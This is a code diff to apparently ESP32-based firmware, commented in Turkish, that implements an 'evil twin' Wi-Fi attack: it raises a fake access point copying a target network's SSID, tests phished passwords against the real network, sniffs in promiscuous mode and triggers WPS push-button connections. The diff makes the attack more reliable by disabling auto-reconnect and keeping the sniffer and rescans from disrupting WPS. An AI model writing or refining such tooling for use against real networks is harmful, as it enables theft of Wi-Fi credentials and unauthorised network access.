@@ -122,6 +122,8 @@ static void et_wps_pbc_loop() {
     if (now < et_wps_retry_after) return;
     // Süre doldu — yeniden başlat
     et_wps_retry_after = 0;
+    // Sniffer WPS ile çakışır — retry öncesi mutlaka durdur
+    esp_wifi_set_promiscuous(false);
     esp_wps_config_t cfg = WPS_CONFIG_INIT_DEFAULT(WPS_TYPE_PBC);
     esp_wifi_wps_enable(&cfg);
     esp_wifi_wps_start(0);
@@ -409,6 +411,7 @@ void start_evil_twin(int wifi_number) {
 
   // APSTA modu — hem sahte AP hem STA (şifre testi için)
   WiFi.mode(WIFI_MODE_APSTA);
+  WiFi.setAutoReconnect(false);  // Auto-reconnect WPS'i bozar — devre dışı
   WiFi.softAP(evil_twin_ssid.c_str(), NULL, evil_twin_channel);
 
   // AP'nin tam başlamasını bekle — ardından TX gücünü uygula
@@ -434,6 +437,9 @@ void start_evil_twin(int wifi_number) {
 bool evil_twin_test_password(const String &password) {
   DEBUG_PRINT("Sifre deneniyor: ");
   DEBUG_PRINTLN(password);
+
+  // Auto-reconnect kapalı tut — disconnect sonrası otomatik bağlantı WPS'i bozar
+  WiFi.setAutoReconnect(false);
 
   // Sniferi durdur (STA bağlantısı snifer ile çakışır)
   esp_wifi_set_promiscuous(false);
@@ -548,7 +554,9 @@ void evil_twin_loop() {
   }
 
   // Hedef yeniden bulma: RETRACK_INTERVAL_MS'de bir
-  if (now - et_last_retrack >= RETRACK_INTERVAL_MS) {
+  // WPS çalışırken retrack YAPILMAZ — WiFi.scanNetworks() WPS'i bozar
+  // ve et_start_sniffer() promiscuous modu açarak WPS ile çakışır.
+  if (!et_wps_pbc_running && now - et_last_retrack >= RETRACK_INTERVAL_MS) {
     et_last_retrack = now;
     et_retrack();
   }
